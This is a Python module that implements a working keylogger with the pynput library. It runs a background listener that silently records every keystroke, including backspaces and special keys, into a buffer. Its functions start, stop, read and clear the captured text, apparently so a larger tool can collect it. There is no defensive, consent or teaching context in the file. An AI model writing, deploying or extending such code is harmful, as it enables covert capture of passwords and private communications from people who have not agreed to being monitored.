"""Keystroke monitor using pynput."""
import threading

try:
    from pynput import keyboard as pynput_keyboard
    PYNPUT_OK = True
except Exception:
    PYNPUT_OK = False

_buffer = []
_buffer_lock = threading.Lock()
_listener = None
MAX_BUFFER = 10000

SPECIAL_KEYS = {
    "Key.space": " ",
    "Key.enter": "\n",
    "Key.tab": "\t",
    "Key.backspace": "[BS]",
    "Key.shift": "",
    "Key.shift_r": "",
    "Key.ctrl_l": "",
    "Key.ctrl_r": "",
    "Key.alt_l": "",
    "Key.alt_gr": "",
    "Key.caps_lock": "[CAPS]",
}


def _on_press(key):
    s = str(key)
    if s in SPECIAL_KEYS:
        ch = SPECIAL_KEYS[s]
    elif s.startswith("Key."):
        ch = f"[{s[4:]}]"
    else:
        ch = s.strip("'")
    if ch:
        with _buffer_lock:
            _buffer.append(ch)
            if len(_buffer) > MAX_BUFFER:
                _buffer.pop(0)


def start():
    global _listener
    if not PYNPUT_OK:
        return False
    if _listener is not None:
        return True
    _listener = pynput_keyboard.Listener(on_press=_on_press)
    _listener.daemon = True
    _listener.start()
    return True


def stop():
    global _listener
    if _listener:
        _listener.stop()
        _listener = None
    return True


def get_data():
    with _buffer_lock:
        return "".join(_buffer)


def get_count():
    with _buffer_lock:
        return len(_buffer)


def clear():
    with _buffer_lock:
        _buffer.clear()


def is_running():
    return _listener is not None and _listener.is_alive()


def is_available():
    return PYNPUT_OK
